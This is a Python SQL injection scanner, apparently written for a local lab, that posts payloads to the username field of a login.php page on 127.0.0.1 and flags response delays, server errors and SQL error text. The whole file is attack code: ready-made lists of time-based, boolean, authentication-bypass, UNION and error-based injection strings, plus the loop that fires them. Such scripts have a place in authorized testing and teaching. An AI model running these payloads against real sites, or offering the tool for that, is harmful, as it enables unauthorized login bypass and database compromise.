import requests
import time
import sys

TARGET_URL = "http://127.0.0.1:33168/login.php"
TIMEOUT_THRESHOLD = 3.0

# Core payload sets
TIME_PAYLOADS = [
    ("MySQL SLEEP 5", "' OR SLEEP(5) -- ", 5),
    ("MySQL SLEEP 3", " OR SLEEP(3) -- ", 3),
    ("PostgreSQL pg_sleep", "' OR pg_sleep(4) -- ", 4),
    ("MySQL BENCHMARK", "' OR BENCHMARK(2000000,MD5(1)) -- ", 3),
    ("MSSQL WAITFOR", "' OR WAITFOR DELAY '0:0:4' -- ", 4),
]

BOOLEAN_PAYLOADS = [
    ("Boolean TRUE", "' OR 1=1 -- ", True),
    ("Boolean FALSE", "' OR 1=2 -- ", False),
    ("Admin TRUE", "admin' AND 1=1 -- ", True),
    ("Admin FALSE", "admin' AND 1=2 -- ", False),
    ("OR true", "' OR '1'='1' -- ", True),
]

AUTH_PAYLOADS = [
    ("Auth bypass", "' OR '1'='1", None),
    ("Admin comment", "admin' -- ", None),
    ("Admin hash", "admin'#", None),
    ("Like wildcard", "admin%' -- ", None),
]

UNION_PAYLOADS = [
    ("UNION 2 cols", "' UNION SELECT 1,2 -- ", None),
    ("UNION 3 cols", "' UNION SELECT 1,2,3 -- ", None),
    ("UNION nulls", "' UNION SELECT NULL,NULL -- ", None),
]

ERROR_PAYLOADS = [
    ("Div by zero", "' OR 1/0 -- ", None),
    ("MySQL extractvalue", "' OR extractvalue(1,concat(0x7e,database(),0x7e)) -- ", None),
]

COMMENT_PAYLOADS = [
    ("Comment --", "admin' -- ", None),
    ("Comment #", "admin'#", None),
    ("Comment /* */", "' OR 1=1/*", None),
]

def test_payload(payload_name, payload, expected_delay=None):
    results = []
    
    # Username test
    start = time.time()
    try:
        resp = requests.post(TARGET_URL, data={'username': payload, 'password': ''}, timeout=30)
        resp_time = time.time() - start
        
        anomalies = []
        if expected_delay and resp_time >= expected_delay - 0.5:
            anomalies.append(f"TIME-BASED SUCCESS: {resp_time:.2f}s (exp {expected_delay}s)")
        
        if resp.status_code >= 500:
            anomalies.append(f"SERVER ERROR: HTTP {resp.status_code}")
        
        if "sql" in resp.text.lower() or "mysql" in resp.text.lower():
            anomalies.append("SQL ERROR")
        
        if anomalies:
            print(f"[!] {payload_name} [Username]")
            for a in anomalies:
                print(f"  -> {a}")
            print(f"  Time: {resp_time:.3f}s | Status: {resp.status_code} | Size: {len(resp.text)}B")
            print()
            results.append(('username', anomalies, resp_time))
        
    except Exception as e:
        print(f"[!] Error testing {payload_name}: {e}")
    
    return results

print("="*80)
print("SQL INJECTION TESTING - /login.php")
print("="*80)
print()

total_found = 0

print("[-] Testing TIME-BASED payloads...")
for name, payload, delay in TIME_PAYLOADS:
    results = test_payload(name, payload, delay)
    if results:
        total_found += len(results)

print("[-] Testing BOOLEAN payloads...")
for name, payload, _ in BOOLEAN_PAYLOADS:
    test_payload(name, payload)

print("[-] Testing AUTH BYPASS payloads...")
for name, payload, _ in AUTH_PAYLOADS:
    test_payload(name, payload)

print("[-] Testing UNION payloads...")
for name, payload, _ in UNION_PAYLOADS:
    test_payload(name, payload)

print("[-] Testing ERROR payloads...")
for name, payload, _ in ERROR_PAYLOADS:
    test_payload(name, payload)

print("[-] Testing COMMENT variations...")
for name, payload, _ in COMMENT_PAYLOADS:
    test_payload(name, payload)

print("="*80)
print("SUMMARY")
print("="*80)
print(f"Total anomalies detected: {total_found}")
